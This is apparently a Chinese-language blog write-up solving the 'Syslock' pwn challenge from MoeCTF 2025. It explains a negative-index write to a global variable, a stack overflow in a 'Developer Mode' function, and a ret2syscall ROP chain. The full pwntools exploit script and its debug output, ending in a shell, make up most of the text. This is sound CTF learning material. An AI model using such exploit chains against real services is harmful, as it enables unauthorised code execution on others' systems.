---
title: 'XiDianCTF MoeCTF 2025 PWN Syslock'
date: '2026-09-05T14:45:01+08:00'
lastmod: '2026-09-05T14:45:01+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，使用生成式AI校对并整理知识点。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=894)

> 根据题目提示，本题可能为ret2syscall[^ret2syscall]。

依旧是IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  write(1, "My lock looks strange鈥攃an you help me?\n", 0x29uLL);
  write(1, "choose mode\n", 0xCuLL);
  i = input();
  if ( i > 4 )
    lose();
  write(1, "Input your password\n", 0x14uLL);
  read(0, (char *)&s + i, 0xCuLL);
  if ( i != 59 )
    lose();
  cheat();
  return 0;
}
```

> 注意到，这里的`i`有两个相悖的检查。
>
> 需要防止跳转到`lose()`分支:
>
> 注意到:
>
> ```assembly
> s:0000000000404069                 align 20h
> .bss:0000000000404080                 public i
> .bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w
> .bss:0000000000404080                                         ; main+54↑r ...
> .bss:0000000000404084                 align 20h
> .bss:00000000004040A0                 public s
> .bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o
> .bss:00000000004040A1                 db    ? ;
> .bss:00000000004040A2                 db    ? ;
> .bss:00000000004040A3                 db    ? ;
> .bss:00000000004040A4                 db    ? ;
> .bss:00000000004040A5                 db    ? ;
> .bss:00000000004040A6                 db    ? ;
> .bss:00000000004040A7                 db    ? ;
> ```
>
> 并且`  read(0, (char *)&s + i, 0xCuLL);`。
>
> 所以我们可以令`i = 0x80 - 0xA0 = -0x20`。
>
> 然后我们就可以覆写i来通过检查了。

```c
int input()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0xFuLL);
  buf[15] = 0;
  return atoi(buf);
}
```

input搞不了栈溢出。

```c
ssize_t cheat()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  write(1, "Developer Mode.\n", 0x10uLL);
  return read(0, buf, 0x100uLL);
}
```

但是`cheat()`可以。



集中注意力可知。

```assembly
.text:000000000040123C ; void gadget()
.text:000000000040123C                 public gadget
.text:000000000040123C gadget          proc near
.text:000000000040123C ; __unwind {
.text:000000000040123C                 endbr64
.text:0000000000401240                 pop     rdi
.text:0000000000401241                 pop     rsi
.text:0000000000401242                 pop     rdx
.text:0000000000401243                 retn
.text:0000000000401243 gadget          endp ; sp-analysis failed
.text:0000000000401243
```

这个`gadget()`属于是大礼包了，一个顶四个。



我们还差个`/bin/sh`字符串，很遗憾没找到。

我们应该利用刚才的可写段，在修改`i`值的同时注入字符串。



我们还差一个pop rax设置系统调用码和syscall。

再次集中注意力可知。

```assembly
0000000004011FD ; __unwind {
.text:00000000004011FD                 endbr64
.text:0000000000401201                 push    rbp
.text:0000000000401202                 mov     rbp, rsp
.text:0000000000401205                 sub     rsp, 10h
.text:0000000000401209                 lea     rax, aSomethingWrong ; "Something wrong.\n"
.text:0000000000401210                 mov     [rbp+buf], rax
.text:0000000000401214                 mov     rcx, [rbp+buf]
.text:0000000000401218                 mov     rax, 1
.text:000000000040121F                 mov     rdi, 1          ; fd
.text:0000000000401226                 mov     rsi, rcx        ; buf
.text:0000000000401229                 mov     rdx, 11h        ; count
.text:0000000000401230                 syscall                 ; LINUX - sys_write
.text:0000000000401232                 mov     edi, 0          ; status
.text:0000000000401237                 call    _exit
.text:0000000000401237 ; } // starts at 4011FD
.text:0000000000401237 lose            endp
```

这里有`syscall`。

由于注意力逐渐涣散，遂使用`ROPgadget`搜索。

```
$ ROPgadget --bin ./pwn | grep "pop rax"
0x0000000000401244 : pop rax ; ret
```

到这里已经结束了，公式化栈溢出即可。



脚本:

```python
from pwn import *
import ctypes
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 51750)



io.recvuntil(b'mode')
io.sendline(b'-32')

io.recvuntil(b'password')
io.send(p32(59) + b'/bin/sh\x00')

io.recvuntil(b'Mode')
io.sendline(b'A' * 64 + b'A' * 8 + p64(0x401244) + p64(59) + p64(0x401240) + p64(0x404080 + 0x4) + p64(0) + p64(0) + p64(0x401230))

io.interactive()
```

> 这里如果不使用`io.secvuntil()`会使其将第二段溢出指令一起读入，导致失败。
> `  read(0, (char *)&s + i, 0xCuLL);`恰好读入12个字节，与构造串长度恰好相等，所以这里需要使用`send()`而不是`sendline()`。



输出:

```
[x] Opening connection to 127.0.0.1 on port 51750
[x] Opening connection to 127.0.0.1 on port 51750: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 51750: Done
[DEBUG] Received 0x35 bytes:
    00000000  4d 79 20 6c  6f 63 6b 20  6c 6f 6f 6b  73 20 73 74  │My l│ock │look│s st│
    00000010  72 61 6e 67  65 e2 80 94  63 61 6e 20  79 6f 75 20  │rang│e···│can │you │
    00000020  68 65 6c 70  20 6d 65 3f  0a 63 68 6f  6f 73 65 20  │help│ me?│·cho│ose │
    00000030  6d 6f 64 65  0a                                     │mode│·│
    00000035
[DEBUG] Sent 0x4 bytes:
    b'-32\n'
[DEBUG] Received 0x14 bytes:
    b'Input your password\n'
[DEBUG] Sent 0xc bytes:
    00000000  3b 00 00 00  2f 62 69 6e  2f 73 68 00               │;···│/bin│/sh·│
    0000000c
[DEBUG] Received 0x10 bytes:
    b'Developer Mode.\n'
[DEBUG] Sent 0x80 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  44 12 40 00  00 00 00 00  │AAAA│AAAA│D·@·│····│
    00000050  3b 00 00 00  00 00 00 00  40 12 40 00  00 00 00 00  │;···│····│@·@·│····│
    00000060  84 40 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │·@@·│····│····│····│
    00000070  00 00 00 00  00 00 00 00  30 12 40 00  00 00 00 00  │····│····│0·@·│····│
    00000080
[*] Switching to interactive mode
.
cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 51750
```





















[^ret2syscall]:[ret2syscall](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall)
